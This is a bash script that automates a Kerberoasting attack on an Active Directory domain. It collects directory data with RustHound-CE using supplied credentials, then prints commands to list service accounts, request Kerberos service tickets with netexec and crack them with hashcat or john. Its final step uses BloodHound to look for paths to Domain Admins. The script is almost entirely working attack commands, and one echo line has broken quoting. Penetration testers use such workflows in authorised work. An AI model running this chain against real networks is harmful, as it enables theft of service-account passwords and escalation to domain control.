#!/bin/bash
# Kerberoasting Workflow Script
# Automates the BloodHound-assisted Kerberoasting process

set -e

# Configuration
DOMAIN="${1:-corp.local}"
USERNAME="${2:-}"
PASSWORD="${3:-}"
OUTPUT_DIR="${4:-./kerberoast}"

# Create output directory
mkdir -p "$OUTPUT_DIR"

echo "========================================"
echo "Kerberoasting Workflow"
echo "========================================"
echo "Domain: $DOMAIN"
echo "Output: $OUTPUT_DIR"
echo "========================================"

# Step 1: Collect AD data
echo ""
echo "[Step 1/5] Collecting AD data with RustHound-CE..."
if command -v rusthound-ce &> /dev/null; then
    rusthound-ce -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" -c All -z -o "$OUTPUT_DIR"
    echo "[+] Collection complete. ZIP saved to $OUTPUT_DIR"
else
    echo "[!] RustHound-CE not found. Please install from: https://github.com/g0h4n/RustHound-CE"
    echo "[+] Skipping collection. Import your own data into BloodHound."
fi

# Step 2: Generate kerberoastable users list
echo ""
echo "[Step 2/5] Generating list of kerberoastable users..."
echo "[+] Import the ZIP into BloodHound and run 'Kerberoastable Users' query"
echo "[+] Export the results to $OUTPUT_DIR/kerberoast.txt"
echo ""
echo "[+] Or use this command to find SPN accounts:"
echo "    ldapsearch -x -H ldap://$DOMAIN -b 'DC=$DOMAIN' '(servicePrincipalName=*)" | grep servicePrincipalName"

# Step 3: Request tickets
echo ""
echo "[Step 3/5] Requesting service tickets..."
echo "[+] Use this command after creating kerberoast.txt:"
echo ""
echo "    netexec ldap $DOMAIN -u $USERNAME -p '$PASSWORD' \\"
echo "      --kerberoasting $OUTPUT_DIR/kerberoast.txt --output-dir $OUTPUT_DIR"
echo ""

# Step 4: Crack hashes
echo "[Step 4/5] Cracking hashes..."
echo "[+] Use hashcat or john on the output files:"
echo ""
echo "    # Hashcat (fastest with GPU)"
echo "    hashcat -m 13100 $OUTPUT_DIR/*.hash /path/to/wordlist.txt"
echo ""
echo "    # John the Ripper"
echo "    john --format=krb5tgs $OUTPUT_DIR/*.hash"
echo ""

# Step 5: Re-query BloodHound
echo "[Step 5/5] Re-query BloodHound with new access..."
echo "[+] After cracking, import new credentials into BloodHound"
echo "[+] Mark the cracked account as 'owned'"
echo "[+] Run 'Shortest Paths to Domain Admins' to find next targets"
echo ""

echo "========================================"
echo "Workflow Complete"
echo "========================================"
echo ""
echo "Next steps:"
echo "1. Import collection ZIP into BloodHound (http://localhost:8080)"
echo "2. Run 'Kerberoastable Users' query"
echo "3. Export results to $OUTPUT_DIR/kerberoast.txt"
echo "4. Request tickets with netexec"
echo "5. Crack hashes with hashcat/john"
echo "6. Re-query BloodHound with new access"
echo "========================================"
